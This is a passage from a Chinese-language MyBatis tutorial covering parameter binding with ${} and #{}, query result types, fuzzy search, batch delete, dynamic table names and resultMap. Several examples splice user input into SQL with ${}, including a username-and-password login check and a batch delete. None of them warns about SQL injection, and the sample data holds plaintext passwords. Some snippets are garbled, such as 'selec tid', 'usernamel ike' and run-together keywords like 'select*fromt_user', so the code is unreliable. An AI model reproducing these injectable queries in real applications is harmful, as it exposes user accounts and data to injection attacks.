xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;User&gt;getUserList();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserList&quot;</span><span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.bean.User&quot;</span>&gt;</span><br>  select*fromt_user<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-2-获取参数值的两种方式">4.2 获取参数值的两种方式</h3><div class="info"><p>MyBatis获取参数值的两种方式：${}和#{}<br>${}的本质就是字符串拼接，#{}的本质就是占位符赋值<br>${}使用字符串拼接的方式拼接sql，若为字符串类型或日期类型的字段进行赋值时，需要手动加单引号；但是#{}使用占位符赋值的方式拼接sql，此时为字符串类型或日期类型的字段进行赋值时，可以自动添加单引号</p></div><blockquote><p>区别: #{}能自动加单引号, ${}不能</p></blockquote><h3 id="4-3-单个字面量类型的参数">4.3 单个字面量类型的参数</h3><p>若mapper接口中的方法参数为单个的字面量类型此时可以使用${}和#{}以任意的名称获取参数的值，注意${}需要手动加单引号</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--User getUserByUsername(String username);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserByUsername&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--select * from t_user where username = #&#123;username&#125;--&gt;</span><br>    select * from t_user where username = &#x27;$&#123;username&#125;&#x27;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-4-多个字面量类型的参数">4.4 多个字面量类型的参数</h3><p>若mapper接口中的方法参数为多个时此时MyBatis会自动将这些参数放在一个map集合中，以arg0,arg1…为键，以参数为值；以<br>param1,param2…为键，以参数为值；因此只需要通过${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--User checkLogin(String username, String password);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkLogin&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--select * from t_user where username = #&#123;param1&#125; and password = #&#123;param2&#125;--&gt;</span><br>    select * from t_user where username = &#x27;$&#123;param1&#125;&#x27; and password = &#x27;$&#123;param2&#125;&#x27;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-5-map集合类型的参数">4.5 map集合类型的参数</h3><p>若mapper接口中的方法需要的参数为多个时，此时可以手动创建map集合，将这些数据放在map中只需要通过${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 验证登录（以map集合作为参数）</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> map</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> */</span><br>User <span class="hljs-title function_">checkLoginByMap</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span>;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--User checkLoginByMap(Map&lt;String, Object&gt; map);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkLoginByMap&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from t_user where username = #&#123;username&#125; and password = #&#123;password&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-6-实体类类型的参数">4.6 实体类类型的参数</h3><p>若mapper接口中的方法参数为实体类对象时此时可以使用${}和#{}，通过访问实体类对象中的属性名(与变量无关,与get,set方法有关)获取属性值，注意${}需要手动加单引号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 验证登录（使用<span class="hljs-doctag">@Param</span>）</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> password</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> */</span><br>User <span class="hljs-title function_">checkLoginByParam</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--void insertUser(User user);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span><br>  insert into t_user values(null,#&#123;username&#125;,#&#123;password&#125;,#&#123;age&#125;,#&#123;gender&#125;,#&#123;email&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-7-使用-Param标识参数">4.7 使用@Param标识参数</h3><p>可以通过@Param注解标识mapper接口中的方法参数此时，会将这些参数放在map集合中，以@Param注解的value属性值为键，以参数为值；以<br>param1,param2…为键，以参数为值；只需要通过${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--User checkLoginByParam(@Param(&quot;username&quot;) String username, @Param(&quot;password&quot;) String password);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkLoginByParam&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from t_user where username = #&#123;username&#125; and password = #&#123;password&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-8-总结">4.8 总结</h3><div class="info"><p>这节主要在说SQL语句中加入可变参数的问题参数分类:<br>单个参数:<br>任意名都可接受多个参数:<br>底层会封装成一个map集合, 生成名为arg0, arg1… 或者 param1, param2… 可通过报错信息得知<br>Map集合:<br>底层既然会封装成一个集合, 那我们直接传入一个集合不久好了, 这样key可自定实体类:<br>传入的是一个实体类, 那其参数就是类的属性名, (这里的属性名是有get, set方法的)<br>使用@Param标识:<br>可自定义底层生成的map集合的键名, 以下就是将arg0改成了username<br>User checkLoginByParam(@Param(“username”) String username);</p></div><h2 id="5-mybatis的各种查询功能">5. mybatis的各种查询功能</h2><h3 id="5-1-查询一个实体类">5.1 查询一个实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*根据用户id查询用户信息</span><br><span class="hljs-comment">*<span class="hljs-doctag">@paramid</span></span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span>*/</span><br>UsergetUserById(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-type">int</span> id);<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--UsergetUserById(@Param(&quot;id&quot;)intid);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>  select * from t_user where id=#&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-2-查询一个list集合">5.2 查询一个list集合</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*查询所有用户信息</span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span>*/</span><br>List&lt;User&gt; <span class="hljs-title function_">getUserList</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;User&gt;getUserList();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserList&quot;</span><span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>  select * from t_user<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-3-查询单个数据">5.3 查询单个数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*查询用户的总记录数</span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*在MyBatis中，对于Java中常用的类型都设置了类型别名</span><br><span class="hljs-comment">*例如：java.lang.Integer--&gt;int|integer</span><br><span class="hljs-comment">*例如：int--&gt;_int|_integer</span><br><span class="hljs-comment">*例如：Map--&gt;map,List--&gt;list</span><br><span class="hljs-comment">*例如:  String-&gt;string*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--intgetCount();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getCount&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;_integer&quot;</span>&gt;</span><br>select count(id) from t_user<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-4-查询一条数据为map集合">5.4 查询一条数据为map集合</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*根据用户id查询用户信息为map集合</span><br><span class="hljs-comment">*<span class="hljs-doctag">@paramid</span></span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span>*/</span><br>Map&lt;String,Object&gt; <span class="hljs-title function_">getUserToMap</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-type">int</span> id)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Map&lt;String,Object&gt;getUserToMap(@Param(&quot;id&quot;)intid);--&gt;</span><br><span class="hljs-comment">&lt;!--结果：&#123;password=123456,sex=男,id=1,age=23,username=admin&#125;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserToMap&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;map&quot;</span>&gt;</span><br>select * from t_user where id=#&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-5-查询多条数据为map集合">5.5 查询多条数据为map集合</h3><p><strong>方式1:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*查询所有用户信息为map集合</span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，此</span><br><span class="hljs-comment">时可以将这些map放在一个list集合中获取*/</span><br>List&lt;Map&lt;String,Object&gt;&gt; <span class="hljs-title function_">getAllUserToMap</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Map&lt;String,Object&gt;getAllUserToMap();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">selec</span> <span class="hljs-attr">tid</span>=<span class="hljs-string">&quot;getAllUserToMap&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;map&quot;</span>&gt;</span><br>select * from t_user<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>方式2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*查询所有用户信息为map集合</span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，并且最终要以一个map的方式返回数据，此时需要通过<span class="hljs-doctag">@MapKey</span>注解设置map集合的键，值是每条数据所对应的map集合</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">@MapKey(&quot;id&quot;)</span><br>Map&lt;String,Object&gt; <span class="hljs-title function_">getAllUserToMap</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Map&lt;String,Object&gt;getAllUserToMap();--&gt;</span><br><span class="hljs-comment">&lt;!--&#123;</span><br><span class="hljs-comment">1=&#123;password=123456,sex=男,id=1,age=23,username=admin&#125;,</span><br><span class="hljs-comment">2=&#123;password=123456,sex=男,id=2,age=23,username=张三&#125;,</span><br><span class="hljs-comment">3=&#123;password=123456,sex=男,id=3,age=23,username=张三&#125;</span><br><span class="hljs-comment">&#125;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getAllUserToMap&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;map&quot;</span>&gt;</span><br>select * from t_user<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-6-总结">5.6 总结</h3><div class="info"><p>这一节主要是各种查询, 主要内容为返回值<br>select标签的 resultType属性: 返回值的类型接口上的注解 @MapKey(“id”) 将查询到的结果返会到map集合中, 以哪个字段作为key, 结果为value, 详见5.5方式2</p></div><h2 id="6-特殊SQL">6. 特殊SQL</h2><h3 id="6-1-模糊查询">6.1 模糊查询</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">*测试模糊查询</span><br><span class="hljs-comment">*<span class="hljs-doctag">@parammohu</span></span><br><span class="hljs-comment">*<span class="hljs-doctag">@return</span>*/</span><br>List&lt;User&gt; <span class="hljs-title function_">testMohu</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;mohu&quot;)</span> String mohu)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;User&gt;testMohu(@Param(&quot;mohu&quot;)Stringmohu);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testMohu&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--select*fromt_userwhereusernamelike&#x27;%$&#123;mohu&#125;%&#x27;--&gt;</span><br><span class="hljs-comment">&lt;!--select*fromt_userwhereusernamelikeconcat(&#x27;%&#x27;,#&#123;mohu&#125;,&#x27;%&#x27;)--&gt;</span><br>select * from t_user where usernamel ike &quot;%&quot;#&#123;mohu&#125;&quot;%&quot; <span class="hljs-comment">&lt;!--不能单引号--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><div class="info"><p>模糊查询主要用 %和_<br>#{}会自动加引号, 会导致参数无法获取解决方法:<br>用${}<br>双引号分割&quot;%“#{mohu}”%&quot;</p></div><h3 id="6-2-批量删除">6.2 批量删除</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 批量删除</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> ids</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">deleteMore</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;ids&quot;)</span> String ids)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--int deleteMore(@Param(&quot;ids&quot;) String ids); 只能用$&#123;&#125;,ids不能加引号 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteMore&quot;</span>&gt;</span><br>delete from t_user where id in ($&#123;ids&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br></code></pre></td></tr></table></figure><div class="info"><p>批量删除, id是序列, 不能出现引号, 变成字符串了    只能用–&gt;${}</p></div><h3 id="6-3-动态设置表名">6.3 动态设置表名</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 动态设置表名，查询所有的用户信息</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> tableName</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br>List&lt;User&gt; <span class="hljs-title function_">getAllUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;tableName&quot;)</span> String tableName)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--List&lt;User&gt; getAllUser(@Param(&quot;tableName&quot;) String tableName);只能用$&#123;&#125;表名不能加</span><br><span class="hljs-comment">引号--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getAllUser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>select * from $&#123;tableName&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><div class="info"><p>表明不能用引号, 只能用–&gt; ${}</p></div><h3 id="6-4-添加功能获取自增的主键">6.4 添加功能获取自增的主键</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 添加用户信息</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> user</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">* useGeneratedKeys：设置使用自增的主键</span><br><span class="hljs-comment">* keyProperty：因为增删改有统一的返回值是受影响的行数，因此只能将获取的自增的主键放在传输的参</span><br><span class="hljs-comment">数user对象的某个属性中</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">insertUser</span><span class="hljs-params">(User user)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--int insertUser(User user);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><br>insert into t_user values(null,#&#123;username&#125;,#&#123;password&#125;,#&#123;age&#125;,#&#123;sex&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br></code></pre></td></tr></table></figure><div class="info"><p>需求: id是自增的, 添加完学生还需要id的用处<br>insert标签两个属性, useGeneratedKeys=“true” keyProperty=“id”</p></div><h3 id="6-5-总结">6.5 总结</h3><div class="info"><p>无</p></div><h2 id="7-自定义映射resultMap-重点">7. 自定义映射resultMap(重点)</h2><h3 id="7-1-resultMap解析">7.1 resultMap解析</h3><blockquote><p>若字段名和实体类中的属性名不一致，则可以通过resultMap设置自定义映射</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">  resultMap：设置自定义映射</span><br><span class="hljs-comment">  属性：</span><br><span class="hljs-comment">  id：表示自定义映射的唯一标识</span><br><span class="hljs-comment">  type：查询的数据要映射的实体类的类型</span><br><span class="hljs-comment">  子标签：</span><br><span class="hljs-comment">  id：设置主键的映射关系</span><br><span class="hljs-comment">  result：设置普通字段的映射关系</span><br><span class="hljs-comment">  association：设置多对一的映射关系</span><br><span class="hljs-comment">  collection：设置一对多的映射关系</span><br><span class="hljs-comment">  属性：</span><br><span class="hljs-comment">  property：设置映射关系中实体类中的属性名</span><br><span class="hljs-comment">  column：设置映射关系中表中的字段名</span><br><span class="hljs-comment">--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_name&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--List&lt;User&gt; testMohu(@Param(&quot;mohu&quot;) String mohu);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testMohu&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;userMap&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--select * from t_user where username like &#x27;%$&#123;mohu&#125;%&#x27;--&gt;</span><br>  select id,user_name,password,age,sex from t_user where user_name like concat(&#x27;%&#x27;,#&#123;mohu&#125;,&#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>若字段名和实体类中的属性名不一致，但是字段名符合数据库的规则（使用_），实体类中的属性名符合Java的规则（使用驼峰）此时也可通过以下两种方式处理字段名和实体类中的属性的映射关系<br>a&gt;可以通过为字段起别名的方式，保证和实体类中的属性名保持一致<br>b&gt;可以在MyBatis的核心配置文件中设置一个全局配置信息mapUnderscoreToCamelCase，可以在查询表中数据时，自动将_类型的字段名转换为驼峰例如：字段名user_name，设置了mapUnderscoreToCamelCase，此时字段名就会转换为<br>userName</p></blockquote><h3 id="7-2-多对一处理">7.2 多对一处理</h3><p><strong>方式1: 级联</strong></p><figure class="highlight 